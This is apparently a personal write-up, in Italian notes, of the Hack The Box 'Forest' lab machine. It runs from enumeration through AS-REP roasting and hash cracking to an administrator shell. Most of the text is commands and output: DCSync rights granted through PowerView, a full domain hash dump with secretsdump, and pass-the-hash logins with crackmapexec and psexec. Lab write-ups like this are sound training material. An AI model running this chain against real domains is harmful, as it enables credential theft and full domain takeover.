@@ -1,0 +1,552 @@
+10.10.10.161
+
+masscan -p1-65535 --rate 1000 --banners --open -e tun0 10.10.10.161
+
+Discovered open port 53/tcp on 10.10.10.161
+Discovered open port 5985/tcp on 10.10.10.161
+Discovered open port 49703/tcp on 10.10.10.161
+Discovered open port 593/tcp on 10.10.10.161
+Discovered open port 135/tcp on 10.10.10.161
+Discovered open port 464/tcp on 10.10.10.161
+Discovered open port 49665/tcp on 10.10.10.161
+Discovered open port 3268/tcp on 10.10.10.161
+Discovered open port 49667/tcp on 10.10.10.161
+Discovered open port 88/tcp on 10.10.10.161
+Discovered open port 49664/tcp on 10.10.10.161
+Discovered open port 139/tcp on 10.10.10.161
+Discovered open port 389/tcp on 10.10.10.161
+Discovered open port 3269/tcp on 10.10.10.161
+Discovered open port 49666/tcp on 10.10.10.161
+Discovered open port 445/tcp on 10.10.10.161
+Discovered open port 49671/tcp on 10.10.10.161
+Discovered open port 47001/tcp on 10.10.10.161
+Discovered open port 49676/tcp on 10.10.10.161
+Discovered open port 49684/tcp on 10.10.10.161
+Discovered open port 49677/tcp on 10.10.10.161
+Discovered open port 9389/tcp on 10.10.10.161
+
+
+nmap -sC -sV -p53,5985,49703,593,135,464,49665,3268,49667,88,49664,139,389,3269,49666,445,49671,47001,49676,49684,49677,9389 10.10.10.161
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-01 23:39 CET
+Nmap scan report for 10.10.10.161
+Host is up (0.25s latency).
+
+PORT      STATE SERVICE      VERSION
+53/tcp    open  domain       Simple DNS Plus
+88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-12-01 22:49:07Z)
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf       .NET Message Framing
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49671/tcp open  msrpc        Microsoft Windows RPC
+49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49677/tcp open  msrpc        Microsoft Windows RPC
+49684/tcp open  msrpc        Microsoft Windows RPC
+49703/tcp open  msrpc        Microsoft Windows RPC
+Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2h49m09s, deviation: 4h37m08s, median: 9m08s
+| smb-os-discovery:
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: FOREST
+|   NetBIOS computer name: FOREST\x00
+|   Domain name: htb.local
+|   Forest name: htb.local
+|   FQDN: FOREST.htb.local
+|_  System time: 2021-12-01T14:50:01-08:00
+| smb-security-mode:
+|   account_used: <blank>
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled and required
+| smb2-time:
+|   date: 2021-12-01T22:50:04
+|_  start_date: 2021-12-01T22:10:26
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 79.45 seconds
+
+1) PORTA 445 (SMB) ANONYMOUS ACCESS
+
+smbclient -L 10.10.10.161       --> niente di interessante
+
+smbclient -L 10.10.10.161                                                                                     9 ⨯
+Enter WORKGROUP\daerves's password:
+Anonymous login successful
+
+	Sharename       Type      Comment
+	---------       ----      -------
+SMB1 disabled -- no workgroup available
+
+2) DNS (PORT 53)
+
+non riesce a trovare nessun hostname
+
+
+3) LDAP
+
+ldapsearch -h 10.10.10.161 -x -s base namingcontexts                                                         32 ⨯
+# extended LDIF
+#
+# LDAPv3
+# base <> (default) with scope baseObject
+# filter: (objectclass=*)
+# requesting: namingcontexts
+#
+
+#
+dn:
+namingContexts: DC=htb,DC=local
+namingContexts: CN=Configuration,DC=htb,DC=local
+namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local
+namingContexts: DC=DomainDnsZones,DC=htb,DC=local
+namingContexts: DC=ForestDnsZones,DC=htb,DC=local
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 2
+# numEntries: 1
+
+
+uso i dc trovati per ottenere altre info:
+ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" > ldap_anonymous.txt
+
+info più specifiche (che si possono anche cercare nel file):
+
+troviamno una lista di oggetti di tipo "Person"
+ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)' > ldap_person.txt
+
+poi ottengo solo i sAMAccountName che sono gli username corrispondenti ad ogni person
+ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)' sAMAccountName | grep sAMAccountName
+
+# requesting: sAMAccountName
+sAMAccountName: Guest
+sAMAccountName: DefaultAccount
+sAMAccountName: FOREST$
+sAMAccountName: EXCH01$
+sAMAccountName: $331000-VK4ADACQNUCA
+sAMAccountName: SM_2c8eef0a09b545acb
+sAMAccountName: SM_ca8c2ed5bdab4dc9b
+sAMAccountName: SM_75a538d3025e4db9a
+sAMAccountName: SM_681f53d4942840e18
+sAMAccountName: SM_1b41c9286325456bb
+sAMAccountName: SM_9b69f1b9d2cc45549
+sAMAccountName: SM_7c96b981967141ebb
+sAMAccountName: SM_c75ee099d0a64c91b
+sAMAccountName: SM_1ffab36a2f5f479cb
+sAMAccountName: HealthMailboxc3d7722
+sAMAccountName: HealthMailboxfc9daad
+sAMAccountName: HealthMailboxc0a90c9
+sAMAccountName: HealthMailbox670628e
+sAMAccountName: HealthMailbox968e74d
+sAMAccountName: HealthMailbox6ded678
+sAMAccountName: HealthMailbox83d6781
+sAMAccountName: HealthMailboxfd87238
+sAMAccountName: HealthMailboxb01ac64
+sAMAccountName: HealthMailbox7108a4e
+sAMAccountName: HealthMailbox0659cc1
+sAMAccountName: sebastien
+sAMAccountName: lucinda
+sAMAccountName: andy
+sAMAccountName: mark
+sAMAccountName: santi
+
+fpormatto con awk per ottenere una lista di usernames:
+
+ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)' sAMAccountName | grep sAMAccountName | grep -v requesting | awk '{print $2}' > usernames.txt
+
+poi elimino quelli che non servono e rimangono solo 5 accounts:
+
+sebastien
+lucinda
+andy
+mark
+santi
+
+
+
+inoltre usando rpcclient
+
+rpcclient -U '' 10.10.10.161
+rpcclient $> enumdomusers
+
+si trova anche un altro utente:
+
+svc-alfresco
+
+che è un service account, ma potrebbe comunque permetterci di accedere
+quindi lo aggiungo al file degli utenti
+ricontrollando il file ottenuto con tutte le info ottenute da ldap-search, effettivamente svc-alfresco c'è
+ma restituisce molte meno info rispetto agli altri e non restituisce nemmeno sAMAccountName perciò non lo tengo nel file
+probabilmente non ho accesso allo OU/DC di cui fa parte quindi ho meno info
+
+ora posso provare eventualmente crackare le password degli utenti trovati anche se è difficile crackare sulla network usando una wordlist molto grande (non ho indicazioni su possibili pwd)
+
+posso farlo con crackmapexec:
+
+prima controllo la pwd policy:
+
+crackmapexec smb 10.10.10.161 --pass-pol -u '' -p ''
+crackmapexec smb 10.10.10.161 --pass-pol
+
+SMB         10.10.10.161    445    FOREST           [+] Dumping password info for domain: HTB
+SMB         10.10.10.161    445    FOREST           Minimum password length: 7
+SMB         10.10.10.161    445    FOREST           Password history length: 24
+SMB         10.10.10.161    445    FOREST           Maximum password age: Not Set
+SMB         10.10.10.161    445    FOREST
+SMB         10.10.10.161    445    FOREST           Password Complexity Flags: 000000
+SMB         10.10.10.161    445    FOREST           	Domain Refuse Password Change: 0
+SMB         10.10.10.161    445    FOREST           	Domain Password Store Cleartext: 0
+SMB         10.10.10.161    445    FOREST           	Domain Password Lockout Admins: 0
+SMB         10.10.10.161    445    FOREST           	Domain Password No Clear Change: 0
+SMB         10.10.10.161    445    FOREST           	Domain Password No Anon Change: 0
+SMB         10.10.10.161    445    FOREST           	Domain Password Complex: 0
+SMB         10.10.10.161    445    FOREST
+SMB         10.10.10.161    445    FOREST           Minimum password age: 1 day 4 minutes
+SMB         10.10.10.161    445    FOREST           Reset Account Lockout Counter: 30 minutes
+SMB         10.10.10.161    445    FOREST           Locked Account Duration: 30 minutes
+SMB         10.10.10.161    445    FOREST           Account Lockout Threshold: None
+SMB         10.10.10.161    445    FOREST           Forced Log off Time: Not Set
+
+
+crackmapexec smb 10.10.10.161 -u userlist.out -p pwlist.txt
+
+è molto difficile che questo comando vada a buon fine quindi conviene nel frattempo concentrarsi su altro
+
+si può controllare se impacket da la possibilità di usare qualche tool per ottenere utleriori informazioni
+
+locate impacket | grep example
+
+
+python3 GetNPUsers.py -h                                                                                      1 ⨯
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+usage: GetNPUsers.py [-h] [-request] [-outputfile OUTPUTFILE] [-format {hashcat,john}] [-usersfile USERSFILE] [-ts]
+                     [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address]
+                     target
+
+Queries target domain for users with 'Do not require Kerberos preauthentication' set and export their TGTs for
+cracking
+
+
+getNPUsers.py sembra interessante
+
+python3 GetNPUsers.py -dc-ip 10.10.10.161 -request 'htb.local/' -format hashcat
+
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC
+------------  ------------------------------------------------------  --------------------------  --------------------------  --------
+svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2021-12-03 00:22:15.918868  2019-09-23 13:09:47.931194  0x410200
+
+
+
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:8af07c7c2fe0c1d7a2768d886e91b141$5b3ad5fa2c15593b5058d45a30e7be900b09b3058b2196b28bfca6bf4069dd990c9080bbdc20aad01cffbb32d3375d31340fd6a9b67a638bb9b1fd8673421942e33999167def65ff2f769085d6b02803cabde6221080157e26b0f07d7465c75231aea8665bbde47d78ad18e6fcb4dbcb3a3d6a164ef21635647e5feacd91918189ffeb4b4a2afdc837bca20c4b94cd3915b34aba9f91ee363df6f77a34462313a78ff367604510c78903b0934cb6e5ce285b96f53a34d0eb27d3ecbb11f4f522d6cfcd85b5acf6f8e1c3876cc6a41fbfd2511afd077eeeed1a7235f8262e63b0241deed2e668
+
+
+
+
+ora posso provare a crackare questo valore con haschcat
+
+$krb5asrep$23$    ---> l'hash è di tipo   18200
+
+
+hashcat -a 0 -m 18200 hash_alfresco /usr/share/wordlists/rockyou.txt
+
+
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:8af07c7c2fe0c1d7a2768d886e91b141$5b3ad5fa2c15593b5058d45a30e7be900b09b3058b2196b28bfca6bf4069dd990c9080bbdc20aad01cffbb32d3375d31340fd6a9b67a638bb9b1fd8673421942e33999167def65ff2f769085d6b02803cabde6221080157e26b0f07d7465c75231aea8665bbde47d78ad18e6fcb4dbcb3a3d6a164ef21635647e5feacd91918189ffeb4b4a2afdc837bca20c4b94cd3915b34aba9f91ee363df6f77a34462313a78ff367604510c78903b0934cb6e5ce285b96f53a34d0eb27d3ecbb11f4f522d6cfcd85b5acf6f8e1c3876cc6a41fbfd2511afd077eeeed1a7235f8262e63b0241deed2e668:s3rvice
+
+la pwd è s3rvice
+
+crackmapexec smb 10.10.10.161 -u svc-alfresco -p s3rvice
+crackmapexec smb 10.10.10.161 -u svc-alfresco -p s3rvice --shares
+
+SMB         10.10.10.161    445    FOREST           [+] htb.local\svc-alfresco:s3rvice
+SMB         10.10.10.161    445    FOREST           [+] Enumerated shares
+SMB         10.10.10.161    445    FOREST           Share           Permissions     Remark
+SMB         10.10.10.161    445    FOREST           -----           -----------     ------
+SMB         10.10.10.161    445    FOREST           ADMIN$                          Remote Admin
+SMB         10.10.10.161    445    FOREST           C$                              Default share
+SMB         10.10.10.161    445    FOREST           IPC$                            Remote IPC
+SMB         10.10.10.161    445    FOREST           NETLOGON        READ            Logon server share
+SMB         10.10.10.161    445    FOREST           SYSVOL          READ            Logon server share
+
+
+visto che c'è la porta 5985 aperta c'è winrm, avendo delle credenziali posso provare ad accedere usando evil-winrm
+evil-winrm.rb -i 10.10.10.161 -u svc-alfresco -p s3rvice
+
+PS C:\Users\svc-alfresco\Documents>
+
+Directory: C:\Users
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        9/18/2019  10:09 AM                Administrator
+d-r---       11/20/2016   6:39 PM                Public
+d-----        9/22/2019   3:29 PM                sebastien
+d-----        9/22/2019   4:02 PM                svc-alfresco
+
+*Evil-WinRM* PS C:\Users\svc-alfresco> cd Desktop
+*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> dir
+
+
+    Directory: C:\Users\svc-alfresco\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        12/2/2021   2:42 PM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> type user.txt
+27cf5bb81d8ec262b131fb1edfad3f70
+
+
+
+a questo punto posso provare ad usare bloodhound per trovare path di attacco in active directory
+
+ho troasferito sharphound sulla macchina usando samba
+e startato bloodhound su kali
+
+faccio partire con sharphound con:
+.\SharpHound.exe -c all
+
+produce l'archivio:
+
+20211203071529_BloodHound.zip
+
+che ripasso su kali attraverso lo stesso samba share
+
+or alo apro con bloodhound (basta trascinarlo sulla fienstra di bloodhound)
+
+analizzando i dati contenuti all'interno vedo che local.htb non è l'unico host:
+
+EXCH01.HTB.LOCAL
+
+posso provare ad usare nslookup sfruttando il server dns sulla macchina
+
+
+> server 10.10.10.161
+Default server: 10.10.10.161
+Address: 10.10.10.161#53
+> EXCH01.HTB.LOCAL
+Server:		10.10.10.161
+Address:	10.10.10.161#53
+
+Name:	EXCH01.HTB.LOCAL
+Address: 10.10.10.7
+Name:	EXCH01.HTB.LOCAL
+Address: dead:beef::9548:657:1098:7fdd
+
+se provo a pingarlo dalla macchina però non è raggiungibile
+
+svc-alfresco fa parte del gruppo
+
+SERVICE ACCOUNTS
+
+che fa parte del gruppo
+
+PRIVILEGED IT ACCOUNTS
+
+che fa parte del gruppo
+
+ACCOUNT OPERATORS
+
+https://networkencyclopedia.com/account-operators-group/
+
+in pratica può creare, modificare ecc account utenti che non siano amministratori e altri gruppi scritti nel link
+
+nel nostro caso potrebbe essere utile creare un account appartente al gruppo
+
+EXCHANGE WINDOWS PERMISSIONS
+
+che come descrizione ha:
+
+This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Windows accounts and groups. This group should not be deleted.
+
+net user daerves password123 /add /domain
+ net group "Exchange Windows Permissions" /add daerves
+
+
+ come suggerito da bloodhound essendo ora nel gruppo Exchange Windows Permissions potrei dare al mio account i permessi di DCSync e ottenere delle pwd attraverso mimikatz
+
+
+ https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync
+
+ si possono aggiungere questi permessi tramite PoverView:
+
+ Add-ObjectACL -PrincipalIdentity daerves -Rights DCSync
+
+	per farlo come daerves che ha la possibilità di aggiungersi questi permessi posso fare:
+
+	$SecPassword = ConvertTo-SecureString 'password123' -AsPlainText -Force
+	$Cred = New-Object System.Management.Automation.PSCredential('HTB\daerves', $SecPassword)
+	Add-ObjectACL -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity daerves -Rights DCSync
+
+
+	ora dovrei poter estrarre gli hash delle password, posso farlo o passando mimikatz sulla macchina ed eseguendolo oppure tramite un altro tool di impacket:
+
+	[/usr/share/doc/python3-impacket/examples]
+└─$ sudo python3 secretsdump.py htb.local/daerves:password123@10.10.10.161
+[sudo] password di daerves:
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
+htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
+htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
+htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
+htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
+htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
+htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
+htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
+htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
+htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
+htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
+htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
+htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
+htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
+htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
+htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
+htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
+daerves:9601:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::
+FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:4ebfc07200e0ef4cda5dad1420fe7318:::
+EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
+[*] Kerberos keys grabbed
+htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
+htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
+htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
+krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
+krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
+krbtgt:des-cbc-md5:9dd5647a31518ca8
+htb.local\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
+htb.local\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
+htb.local\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
+htb.local\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
+htb.local\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
+htb.local\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
+htb.local\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
+htb.local\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
+htb.local\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
+htb.local\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
+htb.local\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
+htb.local\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
+htb.local\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
+htb.local\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
+htb.local\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
+htb.local\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
+htb.local\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
+htb.local\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
+htb.local\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
+htb.local\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
+htb.local\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
+htb.local\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
+htb.local\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
+htb.local\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
+htb.local\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
+htb.local\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
+htb.local\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
+htb.local\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
+htb.local\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
+htb.local\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
+htb.local\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c
+htb.local\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
+htb.local\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
+htb.local\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
+htb.local\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
+htb.local\sebastien:des-cbc-md5:702a3445e0d65b58
+htb.local\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
+htb.local\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
+htb.local\lucinda:des-cbc-md5:a13bb56bd043a2ce
+htb.local\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
+htb.local\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
+htb.local\svc-alfresco:des-cbc-md5:014ac86d0b98294a
+htb.local\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
+htb.local\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
+htb.local\andy:des-cbc-md5:a2ab5eef017fb9da
+htb.local\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
+htb.local\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
+htb.local\mark:des-cbc-md5:b5dff1f40b8f3be9
+htb.local\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
+htb.local\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
+htb.local\santi:des-cbc-md5:4075ad528ab9e5fd
+daerves:aes256-cts-hmac-sha1-96:6b1455001861585e4d5299ef99cd11cda2f6a0fc4507264c5133bda7336fc086
+daerves:aes128-cts-hmac-sha1-96:f401596dd4aa3e3a83799ac983c33cc0
+daerves:des-cbc-md5:e0b668a78acd9743
+FOREST$:aes256-cts-hmac-sha1-96:8f02a93c675b6c5dc66287d3d91d61479ee70f05f4d3e6cd073addcb902baa0e
+FOREST$:aes128-cts-hmac-sha1-96:5219898f12d7f06e0d911247f2cb6c56
+FOREST$:des-cbc-md5:103437852c45b3c1
+EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
+EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
+EXCH01$:des-cbc-md5:8c45f44c16975129
+[*] Cleaning up...
+
+
+
+
+
+
+
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+
+
+è l'hash delle credenziali del local administrator, posso estrarre quindi solo l'hash della pwd:
+
+32693b11e6aa90eb43d32c72a07ceea6
+
+posso accedere con un attacco pass the hash sfruttando crackmapexec:
+
+crackmapexec smb 10.10.10.161 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6:32693b11e6aa90eb43d32c72a07ceea6
+
+infatti ottengo:
+
+SMB         10.10.10.161    445    FOREST           [+] htb.local\administrator 32693b11e6aa90eb43d32c72a07ceea6:32693b11e6aa90eb43d32c72a07ceea6 (Pwn3d!)
+
+ma non una shell, per ottenere la shell sempre con pass the hash posso usare un altro tool di impacket:
+
+sudo python3 psexec.py -hashes 32693b11e6aa90eb43d32c72a07ceea6:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
+
+C:\Windows\system32>
+
+C:\Users\Administrator\Desktop>type root.txt
+0f8ee8e800424b4a20bc7fff4d470299
